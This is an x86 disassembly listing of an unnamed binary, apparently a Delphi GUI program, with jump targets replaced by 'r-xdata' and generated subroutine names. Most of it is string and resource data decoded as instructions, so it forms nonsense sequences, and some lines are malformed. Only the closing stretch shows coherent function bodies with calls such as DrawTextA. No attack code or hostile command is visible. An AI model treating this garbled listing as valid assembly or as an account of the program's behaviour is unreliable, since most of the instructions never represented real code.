cmpsb [ esi ] [ edi ]
stosb [ edi ]
add edi eax
jo r-xdata
jne r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] 0xb
dec edi
jae r-xdata
add [ eax ] al
add [ eax + 0x4f090039 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add edi eax
add [ eax ] eax
inc ebx
push 0x65676e61
cld
jne r-xdata
xor eax [ eax ]
or [ edi + 0x6e ] cl
add ebx [ eax ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
add [ edi ] 0xb
dec ebp
cld
jne r-xdata
mov al 0xa4
stosb [ edi ]
add ebx [ eax ]
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
dec ebx
jns r-xdata
cld
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x3a9 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
dec edi
sbb al 0xa3
stosb [ edi ]
add edx eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090045 ] al
outsb
dec ebx
jns r-xdata
add edi [ eax ]
add [ eax ] eax
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
outsd
ja r-xdata
inc esp
jb r-xdata
cmp [ eax ] 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f07003b ] al
add esi eax
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jne r-xdata
jo r-xdata
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add ebp [ eax ]
test eax 0xa9349203
add edi [ edx + eax ]
inc esp
jb r-xdata
dec esi
outsd
outsb
or al 0x73
jae r-xdata
push ebp
jae r-xdata
inc ebp
outsb
dec edi
mov [ 0x12803aa ] eax
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
popad
je r-xdata
cld
movsb [ edi ] [ esi ]
stosb [ edi ]
add edx [ eax ]
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ebx
jns r-xdata
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ esp + edi ]
add [ eax ] al
movsb [ edi ] [ esi ]
xor al 0xa9
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34 ] bh
mov eax eax
loopne r-xdata
add [ edi - 0x57 ] cl
add esi eax
cmp eax 0x45d403a8
test eax 0x27c03
outsd
jb r-xdata
outsb
push ebx
je r-xdata
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
test al 0xaa
add esi eax
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
fdiv [ edx ]
test eax 0x73730603
jo r-xdata
push ebp
outsb
dec ebp
outsd
jne r-xdata
add [ ebp ] 0x9
dec edi
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
add [ edi + ecx * 2 ] cl
jl r-xdata
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
jae r-xdata
test eax 0x540c0303
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
cmpsb [ esi ] [ edi ]
add esp [ edx + esi * 2 ]
test eax 0xab889803
jpe r-xdata
or dh [ ebx + 0x73 ]
jb r-xdata
je r-xdata
jne r-xdata
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
dec esp
popad
jbe r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
dec esp
daa
test eax 0xa83df003
add edx esp
inc ebp
add [ eax ] al
add esi [ ebx + eax * 2 ]
test eax 0xa6431803
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
je r-xdata
push esi
jb r-xdata
add edi [ eax + 0x1803a96a ]
inc ebx
cmpsb [ esi ] [ edi ]
inc ebp
cmpsb [ esi ] [ edi ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah bl
xor ch [ ecx + 0x73730603 ]
add ebp esp
stosd [ edi ]
outsb
je r-xdata
stosd [ edi ]
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
inc ebx
inc esp
outsb
add esi [ eax ]
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0043 ] al
outsb
push ebx
je r-xdata
dec edi
xchg esp eax
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
insb
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
cmp al 0xab
or [ ebx + 0x74 ] dl
xchg esp eax
jno r-xdata
test al 0x3
in al 0x3a
test al 0x3
adc [ esi ] bh
test al 0x3
insb
jae r-xdata
popad
outsd
jbe r-xdata
dec ebp
je r-xdata
push 0x64745308
inc ebx
inc ecx
add ebx [ eax - 0x13fc5478 ]
stosb [ edi ]
sar [ eax + 0x33 ] 0xa9
add eax [ eax ]
add [ eax ] al
add [ eax ] al
sub_3a941a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx - 0x57 ] al
add ebp [ eax + eax ]
add [ eax ] al
enter 0xaaaf 0x3
enter 0xa645 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
hlt
sub_3a944bb
add esi esp
and al 0xab
add esp [ eax ]
and eax 0xede803ab
stosb [ edi ]
add edx [ ecx + edi * 8 - 0x56 ]
add esp esp
in eax dx
stosb [ edi ]
add esp eax
cli
stosb [ edi ]
add ebp eax
xchg ecx eax
stosd [ edi ]
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
add edx [ esi + esi * 2 ]
stosd [ edi ]
add eax [ ebx + edi * 2 ]
stosd [ edi ]
add esp [ eax + 0x2d ]
stosd [ edi ]
add ebp [ eax ]
xor eax 0x435403ab
stosd [ edi ]
add esp eax
mov ch [ ecx - 0x54bfd3fd ]
add ebx [ ebx + ecx * 4 ]
test eax 0xab43ec03
add edx [ eax ]
inc esp
stosd [ edi ]
add esp [ esp + eax * 2 + 0x42a803ab ]
stosd [ edi ]
add ecx [ eax + 0x42 ]
stosd [ edi ]
add ebp [ eax + 0x4c03ab90 ]
jl r-xdata
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
stosd [ edi ]
add esp [ eax + 0x1c03aafd ]
cld
stosb [ edi ]
add eax [ eax + ecx * 4 + 0x25a403a9 ]
stosd [ edi ]
add esp [ eax + 0x7a ]
stosd [ edi ]
add esp [ eax ]
jpo r-xdata
add ebx eax
push esp
stosd [ edi ]
add ebx [ eax + edx * 4 ]
stosd [ edi ]
add edi [ eax + edi * 2 - 0x6e93fc55 ]
stosd [ edi ]
add esi [ ebx + edi * 2 - 0x77a3fc55 ]
test eax 0xa9888003
add edx [ edx + ecx * 4 - 0x57 ]
add ecx [ eax ]
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
les ecx [ ecx - 0x7d43fc57 ]
sub ebp [ ebx - 0x547767fd ]
add ebp esp
inc edi
dec [ ebx + ecx * 4 - 0x57 ]
add edi [ ebx + ecx * 4 - 0x73bffc57 ]
test eax 0xa98b3803
add eax eax
mov [ ecx - 0x56736bfd ] gs
add ebp [ eax ]
mov ch [ ecx - 0x5675affd ]
add eax [ edi ]
push esp
inc edx
jne r-xdata
xchg esp eax
in eax dx
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
pop esp
je r-xdata
sldt [ edi ]
in al dx
outsb
mov eax eax
mov [ ebp - 0x57 ] es
add eax [ edi ]
pop es
push esp
inc edx
jne r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
int3
add ebx [ edi ]
add bh bh
je r-xdata
inc ecx
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0xa6100073
add ebx [ eax + 0x2 ]
add bh bh
test al 0x8a
test eax 0x103
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add dh bh
lodsb [ esi ]
cld
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi + 0x25903 ] ah
[ ecx + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
push es
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
adc al 0x9f
stosb [ edi ]
add ecx [ eax - 0x47fc5505 ]
sti
stosb [ edi ]
add esp [ edx - 0x55 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
popad
jo r-xdata
outsb
push 0xf003a944
inc ebx
test eax 0x8003703
push ebx
je r-xdata
sbb [ ecx ] 0x0
dec ebx
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add dh bh
push 0x84fe0000
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jo r-xdata
je r-xdata
push ss
add [ eax ] cl
inc esp
jb r-xdata
pop [ eax ]
add bh bh
pop [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
imul ebp [ esi + 0x64 ] r-xdata
xchg esi eax
stosb [ edi ]
add ebx [ edx + eax ]
[ edx + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or ecx [ ebp + 0x6f ]
popad
insb
push edx
jae r-xdata
add [ eax ] eax
add al 0x46
outsd
outsb
je r-xdata
test al 0x3
push 0x7cff0000
cld
xchg esi eax
stosb [ edi ]
add edi [ esi ]
add bh bh
jle r-xdata
add bh bh
pop esp
daa
stosd [ edi ]
add eax [ ecx ]
insb
jae r-xdata
dec eax
insb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax 0x72440a00
popad
inc ebx
jne r-xdata
add al 0xef
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x3c03a78d ] ch
add [ eax ] al
adc [ esi + 0x6003 ] ah
push [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
sahf
stosb [ edi ]
add esi [ eax + 0x7e ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
push cs
add [ 0x67696c41 ] al
outsb
insb
lahf
stosb [ edi ]
add esp [ ecx ]
add bh bh
js r-xdata
stosb [ edi ]
add edx [ ebp + ebp * 8 + 0x3aa ]
add [ eax + 0x3 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
outsd
outsb
je r-xdata
jb r-xdata
stosd [ edi ]
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] 0x0
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
test al 0xfa
stosb [ edi ]
add esp esp
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ esi + 0x25103 ] ah
push [ eax + 0x103a989 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jo r-xdata
adc [ esi + 0x8e03 ] ah
add bh bh
jl r-xdata
jb r-xdata
add [ eax ] al
sbb eax 0x61500e00
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi + 0x5903 ] ah
push [ esp + edi * 8 + 0x103aa ]
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
fadd [ ecx ]
add bh bh
or [ edi - 0x55 ] bh
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
stosb [ edi ]
add ecx [ esp + edi * 8 + 0x3aa ]
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
adc al 0x0
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
sahf
stosb [ edi ]
add ecx [ edi - 0x70010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ esi + 0x5703 ] ah
[ eax - 0x1bfc5506 ]
adc [ esi + 0x8d03 ] ah
jle r-xdata
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
cld
jne r-xdata
jo r-xdata
jb r-xdata
jne r-xdata
add esi eax
jle r-xdata
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
daa
stosb [ edi ]
add eax [ eax + 0x3cff0000 ]
sti
stosb [ edi ]
add eax [ ecx ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
and [ edi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add esi eax
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x4f090028 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add edx [ eax ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ebx ]
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
popad
je r-xdata
cld
movsb [ edi ] [ esi ]
stosb [ edi ]
add edx [ eax ]
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002d ] al
outsb
dec ebx
jns r-xdata
add [ eax + 0x4f07002a ] al
add [ eax ] al
dec edi
jbe r-xdata
jns r-xdata
jb r-xdata
js r-xdata
jae r-xdata
inc ebp
outsb
dec edi
mov [ 0x12803aa ] eax
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xor al [ eax ]
or al 0x4f
sbb al 0xa3
stosb [ edi ]
add eax eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
jb r-xdata
outsb
inc ebp
outsb
jb r-xdata
je r-xdata
jne r-xdata
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
dec ebx
test eax 0x62630b03
push ebp
xor [ eax + eax ] 0x9
dec edi
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
dec esp
popad
jbe r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
xor [ eax ] 0x0
or ecx [ edi + 0x6e ]
jae r-xdata
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add edi eax
add [ eax ] al
add edi eax
add [ eax ] eax
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
jo r-xdata
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
jns r-xdata
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0036 ] al
test al 0xaa
add esi eax
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0035 ] al
push ebp
outsb
jo r-xdata
push ebp
je r-xdata
jne r-xdata
add [ ebp + ecx * 2 - 0x57 ] cl
add eax [ eax ]
add [ eax ] al
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
xchg esp eax
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
xor [ esi ] 0x0
or ecx [ edi + 0x6e ]
dec ebp
cld
jne r-xdata
mov al 0xa4
stosb [ edi ]
add ebx [ eax ]
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
stosd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add al 0x23
movsd [ edi ] [ esi ]
stosb [ edi ]
add ebx eax
add [ eax ] al
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
and al 0x23
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
outsb
add esi [ eax ]
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0032 ] al
add [ eax - 0xffc56be ] bl
pop esp
add al [ eax ]
inc esp
jb r-xdata
popad
outsd
jbe r-xdata
dec ebp
outsb
dec edi
outsb
dec ebp
outsd
jne r-xdata
sbb al 0xa3
stosb [ edi ]
add edx eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090034 ] al
add edi [ eax ]
add [ eax ] eax
inc ecx
sub ebp [ ebx - 0x547767fd ]
add ebp esp
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
and al 0x8d
test eax 0xab82bc03
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
insb
jae r-xdata
inc eax
add [ esp + ecx * 2 ] ch
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp - 0x57 ] cl
add esi [ esi ]
dec ebp
test eax 0x25c03
cwde
dec ebx
test eax 0x540e0303
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
dec ebp
test eax 0xa94d3603
add ebx [ edx + eax ]
je r-xdata
je r-xdata
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x630b03a9 ] dl
bound edx [ ebp + 0x6e ]
sub_3a956b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab9264
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_3aaf278
mov edx 0x11
mov eax esi
call sub_3aaf2ac
mov [ esi + 0x19d ] 0x1
mov [ esi + 0x1a0 ] 0x1
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_3a9575c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3a95844
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x44 ]
xor ecx ecx
mov edx 0x40
call sub_3a63a44
mov [ ebp - 0x44 ] 0x40
mov [ ebp - 0x40 ] 0x2001
mov eax esi
and eax 0x400
cmp eax 0x400
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x190 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
mov [ ebp - 0x3c ] eax
call sub_3abdd24
lea ecx [ ebp - 0x50 ]
mov dl 0x2
call sub_3abdf94
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x54 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x54 ]
call sub_3a65bec
push eax
lea eax [ ebp - 0x58 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x58 ]
call sub_3a65bfc
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_3abdd24
mov dl 0x3
call sub_3abddec
mov ecx [ ebp - 0x4c ]
mov edx edi
call sub_3a90ea4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9584b
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_3a65a94
retn
or [ ebp - 0x40 ] 0x200
sub_3a95854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_3a91b8c
test al al
je r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
mov dl 0x1
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax edi
call sub_3a65730
push eax
push esi
call DrawTextA
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
